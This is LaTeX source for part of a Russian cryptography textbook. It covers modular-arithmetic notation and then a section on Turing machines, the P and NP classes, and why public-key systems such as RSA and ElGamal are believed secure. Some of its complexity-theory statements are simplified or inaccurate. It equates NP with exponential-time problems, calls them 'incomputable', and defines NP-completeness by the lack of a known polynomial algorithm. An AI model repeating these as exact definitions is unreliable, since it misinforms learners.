Выражением $\Mod n$ обозначается вычисление остатка от деления произвольного целого числа на целое число $n$. В полиномиальной арифметике эта операция означает вычисление остатка от деления многочленов.
%далее будем обозначать целые числа или операции с целыми числами, взятыми \emph{по модулю}\index{модуль} целого числа $n$ (остаток от целочисленного деления). Примеры выражений:
    \[ a\mod n, \]
    \[ (a + b)\cdot c\mod n. \]
Равенство
    \[ a = b \mod n \]
означает, что выражения $a$ и $b$ равны (говорят также <<сравнимы>>, <<эквивалентны>>) по модулю $n$.

Множество
    \[ \{ 0, 1, 2, 3, \dots, n-1 \mod n\} \]
состоит из $n$ элементов, где каждый элемент $i$ представляет все целые числа, сравнимые с $i$ по модулю $n$.

Наибольший общий делитель (НОД) двух чисел $a,b$ обозначается $\gcd(a,b)$ (\textit{greatest common divisor}).

Два числа $a,b$ называются взаимно простыми, если они не имеют общих делителей, кроме 1, то есть $\gcd(a,b) = 1$.

Выражение $a \mid b$ означает, что $a$ делит $b$.

\input{birthdays_paradox}

\input{groups}

\input{aes_math}

\input{modular_ariphmetics}

\input{pseudo-primes}

\input{groups_of_ec_points_over_finite_fields}

\section[Полиномиальные и экспоненциальные алгоритмы]{Полиномиальные и \\ экспоненциальные алгоритмы}

Данный раздел поясняет обоснованность стойкости криптосистем с открытым ключом и имеет лишь косвенное отношение к дискретной математике.

Машина Тьюринга (МТ) (модель, представляющая любой вычислительный алгоритм) состоит из следующих частей:
\begin{itemize}
    \item неограниченная лента, разделённая на клетки; в каждой клетке содержится символ из конечного алфавита, содержащего пустой символ blank; если символ ранее не был записан на ленту, то он считается blank;
    \item печатающая головка, которая может считать, записать символ $a_i$ и передвинуть ленту на 1 клетку влево или вправо $d_k$;
    \item конечная таблица действий
    \[ (q_i, a_j) \rightarrow (q_{i1}, a_{j1}, d_k), \]
где $q$ -- состояние машины.
\end{itemize}

Если таблица переходов однозначна, то машина Тьюринга\index{машина Тьюринга} называется детерминированной. \emph{Детерминированная} машина Тьюринга может \emph{имитировать} любую существующую детерминированную ЭВМ. Если таблица переходов неоднозначна, то есть $(q_i, a_j)$ может переходить по нескольким правилам, то машина \emph{недетерминированная}.

Класс задач $\set{P}$ -- задачи, которые могут быть решены за \emph{полиномиальное} время\index{задача!полиномиальная} на \emph{детерминированной} машине Тьюринга. Пример полиномиальной сложности (количество битовых операций)
    \[ O(k^{\textrm{const}}), \]
где $k$ -- длина входных параметров алгоритма. Операция возведения в степень в модульной арифметике $a^b \mod n$ имеет кубическую сложность $O(k^3)$, где $k$ -- двоичная длина чисел $a,b,n$.

Класс задач $\set{NP}$ -- обобщение класса $\set{P} \subseteq \set{NP}$, включает задачи, которые могут быть решены за \emph{полиномиальное} время на \emph{недетерминированной} машине Тьюринга. Пример сложности задач из $\set{NP}$ -- экспоненциальная сложность\index{задача!экспоненциальная}
    \[ O(\textrm{const}^k). \]
Алгоритм Гельфонда решения задачи дискретного логарифмирования (нахождения $x$ для заданных основания $g$, модуля $p$ и $a = g^x \mod p$), описанный в разделе криптостойкости системы Эль-Гамаля\index{криптосистема!Эль-Гамаля}, имеет сложность $O(e^{k/2})$, где $k$ -- двоичная длина чисел.

В криптографии полиномиальные задачи (относящиеся к классу $\set{P}$) считаются \emph{лёгкими и вычислимыми} на ЭВМ, которые являются детерминированными машинами Тьюринга. Для них, по определению, существуют алгоритмы, работающие за время, полиномиальное относительно размера входных данных. Задачи, относящиеся к классу $\set{NP}$, считаются \emph{трудными и невычислимыми} на ЭВМ, так как все известные на сегодняшний день алгоритмы решения таких задач (в общем случае) требуют экспоненциального времени, а значит всегда можно выбрать такой размер входных данных (читай -- размер ключа шифрования), что время вычисления станет сравнимым с возрастом Вселенной.

Класс $\set{NP}$-полных задач -- подмножество задач из $\set{NP}$, для которых не известен полиномиальный алгоритм для детерминированной машины Тьюринга, и все задачи могут быть сведены друг к другу за полиномиальное время на \emph{детерминированной} машине Тьюринга. Например, задача об укладке рюкзака является $\set{NP}$-полной.

Стойкость криптосистем с \emph{открытым} ключом, как правило, основана на $\set{NP}$ или $\set{NP}$-полных задачах:
\begin{enumerate}
    \item RSA\index{криптосистема!RSA} -- $\set{NP}$-задача факторизации (строго говоря, основана на трудности извлечения корня степени $e$ по модулю $n$).
    \item Криптосистемы типа Эль-Гамаля\index{криптосистема!Эль-Гамаля} -- $\set{NP}$-задача дискретного логарифмирования.
\end{enumerate}

\emph{Нерешённой} проблемой является доказательство неравенства
    \[ \set{P} \neq \set{NP}. \]
Именно на гипотезе о том, что для некоторых задач не существует полиномиальных алгоритмов, и основана стойкость криптосистем с открытым ключом.

\input{coincide-index_method}

\input{tasks}

\printindex

\chapter*{Литература}
\addcontentsline{toc}{chapter}{Литература}
\begingroup
\renewcommand{\chapter}[2]{}%
%\bibliographystyle{ugost2008s}
%\bibliography{bibliography}
\printbibliography
\endgroup

\end{document}
